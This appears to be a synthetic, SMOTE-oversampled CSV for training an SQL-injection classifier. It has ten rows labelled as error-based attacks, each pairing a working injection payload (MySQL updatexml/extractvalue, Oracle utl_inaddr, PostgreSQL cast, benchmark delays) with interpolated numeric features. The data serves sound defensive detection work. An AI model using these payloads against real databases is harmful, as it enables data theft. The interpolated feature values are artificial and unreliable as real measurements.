id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000001,attack,error,"1  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )  ",nearest_attack_euclidean,R000202,0.26564535096841624,141.51593777297404,24.703187554594813,3.5913587944895786,33.89043733621557,37.81275021837924,52.40637510918962,17.40637510918962,0.23970338464430335,0.2670569427425886,0.3703135167044943,0.12292615590861372,0.0,0.0,0.0,0.0,0.0,1.0,0.0,10.703187554594813,0.0,0.0,5.703187554594811,1.0,0.0,0.0,0.0,1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.9999999999999999,0.0,0.0,1.1102230246251565e-16,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000002,attack,error,"-7184  )   as fshx where 3408  =  3408 or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --",nearest_attack_euclidean,R000320,0.670647612414448,367.4890474157915,35.622261853947876,3.591523959259808,91.0,60.0,155.8667855618436,60.622261853947876,0.2476513767318886,0.16328662202102545,0.4241071168830367,0.16495488436404923,0.3111309269739364,0.0,3.0,0.0,0.0,3.0,0.0,31.311130926973938,0.0,0.0,1.0,26.0,0.3111309269739362,0.0,1.0,1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.9999999999999999,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,6.0
SMOTE_000003,attack,error,"-6770"" or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  ",nearest_attack_euclidean,R000513,0.3316490972803719,339.91224845185627,32.36677329236153,3.315342794353013,75.83386646180763,48.0,157.46709316944612,58.61128882060254,0.222880052614923,0.1413384128680682,0.46333650804254267,0.17244502647446613,0.0,1.3667732923615261,1.0,0.0,0.0,2.0,0.0,32.24451552824102,0.0,0.0,0.0,23.0,0.0,1.0,0.0,1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.9999999999999999,0.0,0.0,1.1102230246251565e-16,0.1222577641205087,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.1222577641205085
SMOTE_000004,attack,error,"1'  )   or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and   (  'jmjw' like 'jmjw",nearest_attack_euclidean,R000776,0.228407787468549,280.8560428086061,38.37120856172122,4.0401428647811635,111.0,35.0,100.48483424688489,34.37120856172122,0.3953297425753665,0.12465352243367414,0.3576580718210764,0.12235866316988298,4.0,0.0,0.0,0.0,2.0,1.0,0.0,19.37120856172122,0.0,2.0,5.0,3.000000000000001,1.0,0.0,0.0,1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,2.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,10.0
SMOTE_000005,attack,error,"1  )   as wbcd where 9506  =  9506 or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )  --",nearest_attack_euclidean,R000427,0.02595078082896527,324.515310907832,38.939413863479,4.021560963976664,108.63648318087398,63.0,118.878827726958,34.0,0.33475067357272853,0.1941425422257373,0.36633144395272355,0.1047753402488106,0.0,0.0,2.0,0.0,2.0,2.0,0.0,21.0,0.0,0.0,6.0,7.0,0.0,0.0,1.0,1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,0.0,6.0,3.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,14.0
SMOTE_000006,attack,error,"1""  )   where 5298  =  5298 and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   --",nearest_attack_euclidean,R000281,0.20721331926287795,354.84903794385616,35.64653839251416,3.660290210278702,95.93961517754246,53.0,146.58615357005664,59.32326919625707,0.27031746180365857,0.14941683748708903,0.4130480805135384,0.16721762019571398,0.0,1.0,2.0,0.0,0.0,3.0,0.0,29.32326919625708,0.0,3.0,0.0,25.0,0.0,1.0,1.0,1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.9999999999999999,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,6.0
SMOTE_000007,attack,error,"1  )   procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",nearest_attack_euclidean,R000326,0.23701089723595434,151.52187498167604,32.0,3.7527391449493073,50.0,23.0,60.10156248473002,18.420312496946003,0.33031415444229434,0.15194451104345538,0.39621760228803055,0.12152373222621979,0.0,0.0,0.0,0.0,0.0,0.0,0.0,13.420312496946005,0.0,0.0,4.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,2.220446049250313e-16,0.0,0.0,1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000008,attack,error,"1""   )    )    procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (   ""jzbb""  =  ""jzbb",nearest_attack_euclidean,R000661,0.5052771801083565,229.43504928151114,33.0,3.847983968637832,78.09690791338119,37.0,88.16082230316584,26.17731906496411,0.34081312425168664,0.16137150168911601,0.3837972505411357,0.11401812351806158,0.0,4.0,0.0,0.0,0.0,1.7257730216547036,0.0,15.451546043309406,0.0,0.0,5.0,1.7257730216547031,0.0,1.0,0.0,1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.9999999999999999,0.0,0.0,1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.0
SMOTE_000009,attack,error," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  column_name  )   FROM   (  SELECT DISTINCT  (  column_name  )  , ROWNUM AS LIMIT FROM all_tab_columns  )   WHERE LIMIT  =  5   )    )    AND 'i'  =  'i",nearest_attack_euclidean,R000002,0.0,221.0,42.0,4.3919306235717706,123.0,2.0,71.0,25.0,0.5565610859728507,0.009049773755656104,0.3212669683257919,0.11312217194570136,3.0,0.0,0.0,0.0,0.0,3.0,0.0,10.0,0.0,7.0,1.0,3.000000000000001,1.0,0.0,0.0,1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,1.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000010,attack,error,"1""   )    )    or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (   ""vlev"" like ""vlev",nearest_attack_euclidean,R000458,0.5428288434927429,290.1398301989382,37.68559320795753,3.9487957926786668,109.74237283183011,35.0,109.3406777432355,36.056779623872586,0.37860100243138917,0.12083125529214497,0.37628686351754415,0.12428087875892171,0.0,4.0,0.0,0.0,2.0,1.3144067920424718,0.0,20.742372831830114,0.0,2.0,5.0,3.3144067920424716,0.0,1.0,0.0,1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,2.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,10.0
